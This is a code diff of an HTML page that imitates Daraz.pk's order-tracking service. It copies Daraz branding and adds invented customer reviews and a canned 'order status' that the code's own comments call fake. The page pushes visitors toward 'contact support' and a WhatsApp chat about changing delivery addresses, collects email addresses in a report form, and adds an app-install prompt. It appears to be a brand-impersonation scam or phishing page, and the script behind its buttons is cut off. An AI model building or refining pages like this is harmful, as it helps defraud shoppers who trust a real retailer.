@@ -3,235 +3,229 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Daraz.pk - Order Tracking | Pakistan's No.1 Shopping Mall</title>
-    <link rel="icon" href="https://hk786811-wq.github.io/daraz-order-status/logo.png">
-    <meta name="description" content="Track your Daraz orders instantly. Enter your order number to check delivery status.">
-    <meta name="keywords" content="Daraz order tracking, Daraz delivery status, Daraz.pk, online shopping Pakistan">
     <meta name="theme-color" content="#f85606">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="mobile-web-app-capable" content="yes">
+    <link rel="manifest" href="manifest.json">
+    <link rel="apple-touch-icon" href="https://i.ibb.co/JjKznzzH/logo.png">
+    <link rel="icon" href="https://i.ibb.co/JjKznzzH/logo.png">
+    <title>Daraz.pk - Pakistan's No.1 Shopping App</title>
     <style>
+        /* Base Styles */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f85606 url('') no-repeat center center fixed;
-            background-size: cover;
-            color: white;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #f5f5f5;
+            color: #333;
             min-height: 100vh;
         }
-        .top-bar {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 8px;
-            text-align: center;
-            font-size: 12px;
-            backdrop-filter: blur(5px);
-        }
-        .header {
-            padding: 20px;
-            background: rgba(248, 86, 6, 0.95);
-            backdrop-filter: blur(10px);
-        }
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
+
+        /* App Header */
+        .app-header {
+            background: #f85606;
+            padding: 10px 15px;
             display: flex;
-            flex-direction: column;
             align-items: center;
-        }
-        .logo {
-            margin-bottom: 20px;
-        }
-        .logo img {
-            height: 50px;
-        }
-        .search-box {
-            position: relative;
-            width: 100%;
-            max-width: 500px;
-            margin-bottom: 20px;
-        }
-        .search-box input {
-            width: 100%;
-            padding: 15px 60px 15px 20px;
-            border: none;
-            border-radius: 30px;
-            background: rgba(255, 255, 255, 0.2);
+            justify-content: space-between;
             color: white;
-            font-size: 16px;
-            outline: none;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
-        .search-box input::placeholder {
-            color: rgba(255, 255, 255, 0.7);
+        .app-header .logo {
+            height: 35px;
         }
-        .search-box button {
-            position: absolute;
-            right: 5px;
-            top: 5px;
+        .app-header .search-icon, .app-header .cart-icon {
+            width: 24px;
+            height: 24px;
+            filter: brightness(0) invert(1);
+        }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
             background: white;
-            color: #f85606;
-            border: none;
-            padding: 10px 25px;
-            border-radius: 25px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .main {
-            padding: 40px 20px;
-            text-align: center;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .main h1 {
-            font-size: 36px;
-            margin-bottom: 20px;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-        }
-        .main p {
-            font-size: 18px;
-            opacity: 0.9;
-            margin-bottom: 30px;
-        }
-        .features {
             display: flex;
             justify-content: space-around;
-            margin: 40px 0;
-            flex-wrap: wrap;
-            max-width: 1000px;
-            margin: 0 auto 40px;
+            padding: 8px 0;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+            z-index: 1000;
         }
-        .feature {
+        .nav-item {
             text-align: center;
-            margin: 15px;
-            opacity: 0.95;
+            color: #666;
+            text-decoration: none;
+            font-size: 10px;
         }
-        .feature img {
-            width: 50px;
-            height: 50px;
+        .nav-item.active {
+            color: #f85606;
+        }
+        .nav-item img {
+            width: 24px;
+            height: 24px;
+            margin-bottom: 3px;
+        }
+
+        /* Tracking Section */
+        .tracking-section {
+            padding: 15px;
+            background: white;
             margin-bottom: 10px;
         }
-        .brands {
-            max-width: 1200px;
-            margin: 50px auto;
-            padding: 0 20px;
-        }
-        .brands h2 {
-            text-align: center;
-            margin-bottom: 30px;
-            font-size: 24px;
-        }
-        .brands-grid {
+        .tracking-input {
             display: flex;
-            justify-content: space-around;
-            flex-wrap: wrap;
-            gap: 20px;
+            gap: 10px;
         }
-        .brand-logo {
+        .tracking-input input {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .tracking-input button {
+            background: #f85606;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+        }
+
+        /* Order Status Page */
+        #orderStatusPage {
+            display: none;
+        }
+        .order-status-header {
+            background: #f85606;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        .order-status-header h2 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        .order-status-header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        .status-progress {
+            padding: 20px;
+            background: white;
+        }
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin-bottom: 20px;
+        }
+        .progress-steps:before {
+            content: '';
+            position: absolute;
+            top: 12px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e0e0e0;
+            z-index: 1;
+        }
+        .step {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+        }
+        .step-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            margin: 0 auto 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #999;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .step.active .step-icon {
+            background: #f85606;
+            color: white;
+        }
+        .step.completed .step-icon {
+            background: #4CAF50;
+            color: white;
+        }
+        .step-label {
+            font-size: 10px;
+            color: #666;
+        }
+        .step.active .step-label, .step.completed .step-label {
+            color: #333;
+            font-weight: bold;
+        }
+        .order-details {
+            background: white;
+            margin-bottom: 10px;
+            padding: 15px;
+        }
+        .order-details h3 {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        .detail-row .label {
+            color: #666;
+        }
+        .support-card {
             background: white;
             padding: 15px;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            transition: transform 0.3s;
-        }
-        .brand-logo:hover {
-            transform: translateY(-5px);
-        }
-        .brand-logo img {
-            height: 40px;
-            filter: grayscale(100%);
-            transition: filter 0.3s;
-        }
-        .brand-logo:hover img {
-            filter: grayscale(0%);
-        }
-        .reviews {
-            max-width: 1000px;
-            margin: 50px auto;
-            padding: 0 20px;
-        }
-        .reviews h2 {
             text-align: center;
-            margin-bottom: 30px;
-            font-size: 24px;
-        }
-        .reviews-grid {
-            display: flex;
-            overflow-x: auto;
-            gap: 20px;
-            padding-bottom: 20px;
-        }
-        .review-card {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 20px;
-            border-radius: 10px;
-            min-width: 300px;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        .review-header {
-            display: flex;
-            align-items: center;
             margin-bottom: 10px;
         }
-        .review-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            margin-right: 10px;
-            background: #ddd;
+        .support-card h3 {
+            font-size: 16px;
+            margin-bottom: 5px;
         }
-        .review-name {
+        .support-card p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+        .support-btn {
+            background: #f85606;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
             font-weight: bold;
+            font-size: 14px;
         }
-        .review-rating {
-            color: #ffc107;
-            margin-left: auto;
-        }
-        .footer {
-            background: rgba(0, 0, 0, 0.7);
-            padding: 30px 20px;
-            text-align: center;
-            margin-top: 50px;
-        }
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            margin-bottom: 20px;
-        }
-        .footer-links a {
-            color: #ccc;
-            margin: 0 15px;
-            text-decoration: none;
-        }
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-        .social-icons {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-        .social-icons img {
-            width: 30px;
-            height: 30px;
-            opacity: 0.7;
-            transition: opacity 0.3s;
-        }
-        .social-icons img:hover {
-            opacity: 1;
-        }
+
+        /* WhatsApp Float */
         .whatsapp-float {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
+            bottom: 70px;
+            right: 15px;
             background: #25D366;
             color: white;
-            padding: 12px 18px;
+            padding: 10px 15px;
             border-radius: 50px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.2);
             display: flex;
             align-items: center;
-            font-size: 16px;
-            z-index: 1000;
+            font-size: 14px;
+            z-index: 999;
             cursor: pointer;
             transition: transform 0.3s;
         }
@@ -239,10 +233,11 @@
             transform: scale(1.05);
         }
         .whatsapp-float img {
-            width: 24px;
-            margin-right: 8px;
+            width: 20px;
+            margin-right: 5px;
         }
-        /* Report Modal Styles */
+
+        /* Report Modal */
         #reportModal {
             display: none;
             position: fixed;
@@ -257,18 +252,20 @@
         }
         #reportModal > div {
             background: white;
-            padding: 30px;
+            padding: 20px;
             border-radius: 10px;
-            max-width: 400px;
+            max-width: 300px;
             width: 90%;
         }
-        #reportModal h2 {
+        #reportModal h3 {
             color: #f85606;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
+            text-align: center;
         }
         #reportModal label {
             display: block;
             margin-bottom: 5px;
+            font-size: 14px;
             font-weight: bold;
         }
         #reportModal input, #reportModal textarea {
@@ -277,368 +274,312 @@
             border: 1px solid #ddd;
             border-radius: 5px;
             margin-bottom: 15px;
+            font-size: 14px;
         }
         #reportModal textarea {
-            min-height: 100px;
+            min-height: 80px;
         }
         #reportModal button {
             background: #f85606;
             color: white;
             border: none;
-            padding: 12px 25px;
+            padding: 10px 20px;
             border-radius: 5px;
             cursor: pointer;
             font-weight: bold;
+            width: 100%;
         }
         #reportModal button[type="button"] {
             background: #ccc;
             color: #333;
-            margin-left: 10px;
+            margin-top: 10px;
         }
-        /* Fake Order Status Page Styles */
-        #orderStatusPage {
-            display: none;
-            background: #f5f5f5;
-            color: #333;
-        }
-        #orderStatusPage .header {
-            background: #f85606;
-            padding: 15px 20px;
+
+        /* Install Prompt */
+        .install-prompt {
+            position: fixed;
+            bottom: 70px;
+            left: 15px;
+            right: 15px;
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            z-index: 1000;
         }
-        #orderStatusPage .header .logo {
+        .install-prompt img {
+            width: 40px;
             height: 40px;
-        }
-        #orderStatusPage .main {
-            max-width: 800px;
-            margin: 30px auto;
-            padding: 0 20px;
-        }
-        #orderStatusPage .order-header {
-            background: white;
-            padding: 20px;
+            margin-right: 15px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
         }
-        #orderStatusPage .progress-bar {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
+        .install-prompt .info {
+            flex: 1;
         }
-        #orderStatusPage .progress-steps {
-            display: flex;
-            justify-content: space-between;
-            position: relative;
-            margin-bottom: 30px;
+        .install-prompt .info h4 {
+            font-size: 14px;
+            margin-bottom: 3px;
         }
-        #orderStatusPage .progress-steps:before {
-            content: '';
-            position: absolute;
-            top: 15px;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: #e0e0e0;
-            z-index: 1;
+        .install-prompt .info p {
+            font-size: 12px;
+            color: #666;
         }
-        #orderStatusPage .step {
-            position: relative;
-            z-index: 2;
-            text-align: center;
-        }
-        #orderStatusPage .step-icon {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            background: #e0e0e0;
-            margin: 0 auto 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #999;
-            font-weight: bold;
-        }
-        #orderStatusPage .step.active .step-icon {
-            background: #f85606;
-            color: white;
-        }
-        #orderStatusPage .step.completed .step-icon {
-            background: #4CAF50;
-            color: white;
-        }
-        #orderStatusPage .order-details {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
-        }
-        #orderStatusPage .contact-support {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        #orderStatusPage .contact-btn {
+        .install-prompt button {
             background: #f85606;
             color: white;
             border: none;
-            padding: 12px 30px;
-            border-radius: 25px;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
             font-weight: bold;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        @media (max-width: 768px) {
-            .main h1 { font-size: 28px; }
-            .main p { font-size: 16px; }
-            .features { flex-direction: column; align-items: center; }
-            .footer-links { flex-direction: column; gap: 10px; }
         }
     </style>
 </head>
 <body>
-    <!-- Main Tracking Page -->
+    <!-- Install Prompt (PWA) -->
+    <div class="install-prompt" id="installPrompt" style="display: none;">
+        <img src="https://i.ibb.co/JjKznzzH/logo.png" alt="Daraz">
+        <div class="info">
+            <h4>Install Daraz App</h4>
+            <p>Get faster tracking and notifications</p>
+        </div>
+        <button onclick="installApp()">Install</button>
+    </div>
+
+    <!-- App Header -->
+    <div class="app-header">
+        <img src="https://i.ibb.co/JjKznzzH/logo.png" class="logo" alt="Daraz">
+        <div style="display: flex; gap: 15px;">
+            <img src="https://img.icons8.com/ios-filled/50/ffffff/search.png" class="search-icon" alt="Search">
+            <img src="https://img.icons8.com/ios-filled/50/ffffff/shopping-cart.png" class="cart-icon" alt="Cart">
+        </div>
+    </div>
+
+    <!-- Main Content -->
     <div id="trackingPage">
-        <div class="top-bar">
-            Welcome to Daraz.pk | Pakistan's Largest Online Shopping Mall | Free Delivery Nationwide
+        <!-- Tracking Section -->
+        <div class="tracking-section">
+            <h2 style="margin-bottom: 15px; font-size: 18px;">Track Your Order</h2>
+            <div class="tracking-input">
+                <input type="text" id="orderInput" placeholder="Enter order number (e.g. 12345678)">
+                <button onclick="trackOrder()">TRACK</button>
+            </div>
+            <p style="margin-top: 10px; font-size: 12px; color: #666;">
+                Enter your Daraz order number to check delivery status
+            </p>
         </div>
 
-        <div class="header">
-            <div class="header-container">
-                <div class="logo">
-                    <img src="https://hk786811-wq.github.io/daraz-order-status/logo.png" alt="Daraz.pk Logo">
+        <!-- Features -->
+        <div style="background: white; padding: 15px; margin-bottom: 10px;">
+            <div style="display: flex; justify-content: space-around; text-align: center;">
+                <div style="opacity: 0.8;">
+                    <img src="https://img.lazcdn.com/us/domino/ce0417bf-fd98-4778-978e-e29c3049e288_PK-150-150.png_120x120q80.png_.avif" style="width: 30px; height: 30px; margin-bottom: 5px;">
+                    <div style="font-size: 10px;">Fast Delivery</div>
                 </div>
-                <div class="search-box">
-                    <input type="text" id="orderInput" placeholder="Enter your Daraz order number (e.g. 12345678)">
-                    <button onclick="trackOrder()">TRACK ORDER</button>
+                <div style="opacity: 0.8;">
+                    <img src="https://img.lazcdn.com/us/domino/e5c3cd93-b796-410f-9bfd-fbfdaa055149_PK-144-84.png" style="width: 30px; height: 30px; margin-bottom: 5px;">
+                    <div style="font-size: 10px;">Secure Payment</div>
                 </div>
-                <div style="display: flex; gap: 20px; font-size: 14px;">
-                    <a href="#" style="color: white; text-decoration: none;">Help Center</a>
-                    <a href="#" onclick="document.getElementById('reportModal').style.display='flex'; return false;" style="color: white; text-decoration: none;">Report an Issue</a>
-                    <a href="#" style="color: white; text-decoration: none;">Login</a>
+                <div style="opacity: 0.8;">
+                    <img src="https://i.ibb.co/XZ6LKxpL/24-hours-support.png" style="width: 30px; height: 30px; margin-bottom: 5px;">
+                    <div style="font-size: 10px;">24/7 Support</div>
                 </div>
-            </div>
-        </div>
-
-        <div class="main">
-            <h1>Track Your Daraz Order</h1>
-            <p>Enter your order number above to check the latest delivery status. Track your package in real-time from warehouse to your doorstep.</p>
-        </div>
-
-        <div class="features">
-            <div class="feature">
-                <img src="https://img.lazcdn.com/us/domino/ce0417bf-fd98-4778-978e-e29c3049e288_PK-150-150.png_120x120q80.png_.avif" alt="Fast Delivery">
-                <div>Fast Delivery</div>
-            </div>
-            <div class="feature">
-                <img src="https://img.lazcdn.com/us/domino/e5c3cd93-b796-410f-9bfd-fbfdaa055149_PK-144-84.png">
-                <div>Secure Payment</div>
-            </div>
-            <div class="feature">
-                <img src="https://i.ibb.co/XZ6LKxpL/24-hours-support.png" alt="24/7 Support">
-                <div>24/7 Support</div>
-            </div>
-            <div class="feature">
-                <img src="https://img.icons8.com/ios-filled/50/ffffff/return.png" alt="Easy Returns">
-                <div>Easy Returns</div>
-            </div>
-        </div>
-
-        <div class="brands">
-            <h2>Top Brands on Daraz</h2>
-            <div class="brands-grid">
-                <div class="brand-logo">
-                    <img src="https://img.drz.lazcdn.com/static/pk/p/40ee9f97430eaccdfbd856f74c374baa.jpg_400x400q80.jpg_.avif" alt="iPhone">
-                </div>
-                <div class="brand-logo">
-                    <img src="https://img.drz.lazcdn.com/static/pk/p/80e9dfb7d92641c17ee7099076e5e2c5.jpg_400x400q75.avif" alt="Samsung">
-                </div>
-                <div class="brand-logo">
-                    <img src="https://img.drz.lazcdn.com/static/pk/p/3dcaa24b8674ac7004495654d0331ff9.jpg_400x400q75.avif" alt="OPPO">
-                </div>
-                <div class="brand-logo">
-                    <img src="https://img.drz.lazcdn.com/static/pk/p/0671fa0709dda5e877d5d7b4e2edacc9.jpg_400x400q75.avif" alt="Dawlance">
-                </div>
-                <div class="brand-logo">
-                    <img src="https://img.drz.lazcdn.com/static/pk/p/b83addc7c2e1d723b86ba989d5a7d4b1.jpg_400x400q75.jpg_.webp" alt="Nike">
-                </div>
-                <div class="brand-logo">
-                    <img src="https://img.drz.lazcdn.com/static/pk/p/86ec0a6f8ce0473f85706a8dd036b9ad.png_400x400q75.avif" alt="Khaadi">
+                <div style="opacity: 0.8;">
+                    <img src="https://img.icons8.com/ios-filled/50/666666/return.png" style="width: 30px; height: 30px; margin-bottom: 5px;">
+                    <div style="font-size: 10px;">Easy Returns</div>
                 </div>
             </div>
         </div>
 
-        <div class="reviews">
-            <h2>What Our Customers Say</h2>
-            <div class="reviews-grid">
-                <div class="review-card">
-                    <div class="review-header">
-                        <img src="https://randomuser.me/api/portraits/men/32.jpg" class="review-avatar" alt="Customer">
-                        <div class="review-name">Ahmad K.</div>
-                        <div class="review-rating">⭐⭐⭐⭐⭐</div>
+        <!-- Top Brands -->
+        <div style="background: white; padding: 15px; margin-bottom: 10px;">
+            <h3 style="margin-bottom: 10px; font-size: 16px;">Top Brands</h3>
+            <div style="display: flex; overflow-x: auto; gap: 15px;">
+                <div style="text-align: center; min-width: 60px;">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/40ee9f97430eaccdfbd856f74c374baa.jpg_400x400q80.jpg_.avif" style="width: 50px; height: 50px; border-radius: 50%; margin-bottom: 5px;">
+                    <div style="font-size: 10px;">iPhone</div>
+                </div>
+                <div style="text-align: center; min-width: 60px;">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/80e9dfb7d92641c17ee7099076e5e2c5.jpg_400x400q75.avif" style="width: 50px; height: 50px; border-radius: 50%; margin-bottom: 5px;">
+                    <div style="font-size: 10px;">Samsung</div>
+                </div>
+                <div style="text-align: center; min-width: 60px;">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/3dcaa24b8674ac7004495654d0331ff9.jpg_400x400q75.avif" style="width: 50px; height: 50px; border-radius: 50%; margin-bottom: 5px;">
+                    <div style="font-size: 10px;">OPPO</div>
+                </div>
+                <div style="text-align: center; min-width: 60px;">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/0671fa0709dda5e877d5d7b4e2edacc9.jpg_400x400q75.avif" style="width: 50px; height: 50px; border-radius: 50%; margin-bottom: 5px;">
+                    <div style="font-size: 10px;">Dawlance</div>
+                </div>
+                <div style="text-align: center; min-width: 60px;">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/b83addc7c2e1d723b86ba989d5a7d4b1.jpg_400x400q75.jpg_.webp" style="width: 50px; height: 50px; border-radius: 50%; margin-bottom: 5px;">
+                    <div style="font-size: 10px;">Nike</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Customer Reviews -->
+        <div style="background: white; padding: 15px;">
+            <h3 style="margin-bottom: 10px; font-size: 16px;">Customer Reviews</h3>
+            <div style="display: flex; overflow-x: auto; gap: 15px;">
+                <div style="background: #f9f9f9; padding: 10px; border-radius: 8px; min-width: 250px;">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <img src="https://randomuser.me/api/portraits/men/32.jpg" style="width: 30px; height: 30px; border-radius: 50%; margin-right: 8px;">
+                        <div>
+                            <div style="font-size: 12px; font-weight: bold;">Ahmad K.</div>
+                            <div style="color: #ffc107; font-size: 12px;">⭐⭐⭐⭐⭐</div>
+                        </div>
                     </div>
-                    <p>Got my iPhone 15 in just 2 days! Daraz delivery is super fast. Highly recommend.</p>
+                    <p style="font-size: 12px; color: #666;">Got my iPhone 15 in just 2 days! Daraz delivery is super fast.</p>
                 </div>
-                <div class="review-card">
-                    <div class="review-header">
-                        <img src="https://randomuser.me/api/portraits/women/44.jpg" class="review-avatar" alt="Customer">
-                        <div class="review-name">Sana R.</div>
-                        <div class="review-rating">⭐⭐⭐⭐⭐</div>
+                <div style="background: #f9f9f9; padding: 10px; border-radius: 8px; min-width: 250px;">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <img src="https://randomuser.me/api/portraits/women/44.jpg" style="width: 30px; height: 30px; border-radius: 50%; margin-right: 8px;">
+                        <div>
+                            <div style="font-size: 12px; font-weight: bold;">Sana R.</div>
+                            <div style="color: #ffc107; font-size: 12px;">⭐⭐⭐⭐⭐</div>
+                        </div>
                     </div>
-                    <p>The best online shopping experience in Pakistan. Easy returns and great customer service.</p>
-                </div>
-                <div class="review-card">
-                    <div class="review-header">
-                        <img src="https://randomuser.me/api/portraits/men/75.jpg" class="review-avatar" alt="Customer">
-                        <div class="review-name">Ali H.</div>
-                        <div class="review-rating">⭐⭐⭐⭐</div>
-                    </div>
-                    <p>Ordered a washing machine and it arrived in perfect condition. Will shop again.</p>
-                </div>
-                <div class="review-card">
-                    <div class="review-header">
-                        <img src="https://randomuser.me/api/portraits/women/68.jpg" class="review-avatar" alt="Customer">
-                        <div class="review-name">Ayesha S.</div>
-                        <div class="review-rating">⭐⭐⭐⭐⭐</div>
-                    </div>
-                    <p>Daraz has the best prices in Pakistan. Found amazing deals on electronics.</p>
+                    <p style="font-size: 12px; color: #666;">Best online shopping experience in Pakistan. Easy returns.</p>
                 </div>
             </div>
-        </div>
-
-        <div class="footer">
-            <div class="social-icons">
-                <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/facebook-new.png" alt="Facebook"></a>
-                <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/instagram-new--v1.png" alt="Instagram"></a>
-                <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/youtube-play.png" alt="YouTube"></a>
-                <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/twitter.png" alt="Twitter"></a>
-            </div>
-            <div class="footer-links">
-                <a href="#">About Daraz</a>
-                <a href="#">Careers</a>
-                <a href="#">Daraz Blog</a>
-                <a href="#">Terms & Conditions</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Digital Payments</a>
-                <a href="#">Daraz Affiliate Program</a>
-                <a href="#">Help Center</a>
-                <a href="#" onclick="document.getElementById('reportModal').style.display='flex'; return false;">Report an Issue</a>
-                <a href="#">Returns & Refunds</a>
-                <a href="#">Daraz Mart</a>
-            </div>
-            <p style="font-size: 12px; opacity: 0.7;">© 2024 Daraz.pk. All Rights Reserved. Daraz is a registered trademark of Daraz Group.</p>
-        </div>
-
-        <div class="whatsapp-float" onclick="openChat()">
-            <img src="https://img.icons8.com/ios-filled/50/ffffff/whatsapp.png" alt="WhatsApp">
-            Chat with Daraz
         </div>
     </div>
 
-    <!-- Fake Order Status Page -->
+    <!-- Order Status Page -->
     <div id="orderStatusPage">
-        <div class="header">
-            <img src="https://i.ibb.co/3k5fX2G/daraz-logo.png" class="logo" alt="Daraz Logo">
-            <a href="#" onclick="document.getElementById('orderStatusPage').style.display='none'; document.getElementById('trackingPage').style.display='block';" style="color: white; text-decoration: none;">Back to Tracking</a>
+        <div class="order-status-header">
+            <h2 id="orderNumberTitle">Order #12345678</h2>
+            <p id="orderStatus">Delivery in Progress</p>
         </div>
 
-        <div class="main">
-            <div class="order-header">
-                <h1 id="orderNumberTitle">Order #12345678</h1>
-                <p id="orderDate">Placed on 15 May 2024</p>
-                <div class="status">Delivery in Progress</div>
-            </div>
-
-            <div class="progress-bar">
-                <div class="progress-steps">
-                    <div class="step completed">
-                        <div class="step-icon">✓</div>
-                        <div class="step-label">Order Placed</div>
-                    </div>
-                    <div class="step completed">
-                        <div class="step-icon">✓</div>
-                        <div class="step-label">Processing</div>
-                    </div>
-                    <div class="step active">
-                        <div class="step-icon">🚚</div>
-                        <div class="step-label">Shipped</div>
-                    </div>
-                    <div class="step">
-                        <div class="step-icon">📦</div>
-                        <div class="step-label">Delivered</div>
-                    </div>
+        <div class="status-progress">
+            <div class="progress-steps">
+                <div class="step completed">
+                    <div class="step-icon">✓</div>
+                    <div class="step-label">Order Placed</div>
                 </div>
-                <p style="text-align: center; color: #666; font-size: 14px;">
-                    Your order is out for delivery. Estimated delivery: <strong id="estimatedDate">17 May 2024</strong>
-                </p>
-            </div>
-
-            <div class="order-details">
-                <h2>Order Information</h2>
-                <div class="detail-row">
-                    <div class="label">Order Number:</div>
-                    <div class="value" id="orderNumberValue">12345678</div>
+                <div class="step completed">
+                    <div class="step-icon">✓</div>
+                    <div class="step-label">Processing</div>
                 </div>
-                <div class="detail-row">
-                    <div class="label">Order Date:</div>
-                    <div class="value" id="orderDateValue">15 May 2024</div>
+                <div class="step active">
+                    <div class="step-icon">🚚</div>
+                    <div class="step-label">Shipped</div>
                 </div>
-                <div class="detail-row">
-                    <div class="label">Payment Method:</div>
-                    <div class="value">Cash on Delivery</div>
-                </div>
-                <div class="detail-row">
-                    <div class="label">Delivery Address:</div>
-                    <div class="value" id="deliveryAddress">House #123, Street 45, G-11/2, Islamabad</div>
+                <div class="step">
+                    <div class="step-icon">📦</div>
+                    <div class="step-label">Delivered</div>
                 </div>
             </div>
+            <p style="text-align: center; font-size: 12px; color: #666;">
+                Estimated delivery: <strong id="estimatedDate">17 May 2024</strong>
+            </p>
+        </div>
 
-            <div class="contact-support">
-                <h2>Need to Change Delivery Address?</h2>
-                <p>Contact Daraz Support immediately to update your delivery details.</p>
-                <button class="contact-btn" onclick="contactSupport()">CONTACT SUPPORT</button>
+        <div class="order-details">
+            <h3>Order Information</h3>
+            <div class="detail-row">
+                <div class="label">Order Number:</div>
+                <div class="value" id="orderNumberValue">12345678</div>
+            </div>
+            <div class="detail-row">
+                <div class="label">Order Date:</div>
+                <div class="value" id="orderDateValue">15 May 2024</div>
+            </div>
+            <div class="detail-row">
+                <div class="label">Payment Method:</div>
+                <div class="value">Cash on Delivery</div>
+            </div>
+            <div class="detail-row">
+                <div class="label">Delivery Address:</div>
+                <div class="value" id="deliveryAddress">House #123, Street 45, G-11/2, Islamabad</div>
             </div>
         </div>
 
-        <div class="footer" style="background: rgba(0,0,0,0.7); color: #ccc;">
-            © 2024 Daraz.pk. All Rights Reserved
+        <div class="support-card">
+            <h3>Need Help?</h3>
+            <p>Contact Daraz Support to change delivery address or report an issue</p>
+            <button class="support-btn" onclick="contactSupport()">CONTACT SUPPORT</button>
+        </div>
+
+        <div style="text-align: center; padding: 15px; font-size: 12px; color: #666;">
+            <button onclick="document.getElementById('orderStatusPage').style.display='none'; document.getElementById('trackingPage').style.display='block';" style="background: none; border: none; color: #f85606; font-size: 12px;">← Back to Tracking</button>
         </div>
     </div>
 
-    <!-- Report Issue Modal -->
+    <!-- Report Modal -->
     <div id="reportModal">
         <div>
-            <h2>Report an Issue</h2>
+            <h3>Report an Issue</h3>
             <form onsubmit="submitReport(event)">
-                <div>
-                    <label>Order Number</label>
-                    <input type="text" id="reportOrder" required>
-                </div>
-                <div>
-                    <label>Issue Description</label>
-                    <textarea id="reportIssue" required></textarea>
-                </div>
-                <div>
-                    <label>Your Email</label>
-                    <input type="email" id="reportEmail" required>
-                </div>
+                <label>Order Number</label>
+                <input type="text" id="reportOrder" required>
+
+                <label>Issue Description</label>
+                <textarea id="reportIssue" placeholder="Describe your issue..." required></textarea>
+
+                <label>Your Email</label>
+                <input type="email" id="reportEmail" placeholder="your@email.com" required>
+
                 <button type="submit">Submit Report</button>
                 <button type="button" onclick="document.getElementById('reportModal').style.display='none'">Cancel</button>
             </form>
         </div>
     </div>
 
+    <!-- WhatsApp Float Button -->
+    <div class="whatsapp-float" onclick="openChat()">
+        <img src="https://img.icons8.com/ios-filled/50/ffffff/whatsapp.png" alt="WhatsApp">
+        <span>Chat</span>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <a href="#" class="nav-item active">
+            <img src="https://img.icons8.com/ios-filled/50/f85606/home.png" alt="Home">
+            <div>Home</div>
+        </a>
+        <a href="#" class="nav-item" onclick="document.getElementById('reportModal').style.display='flex'">
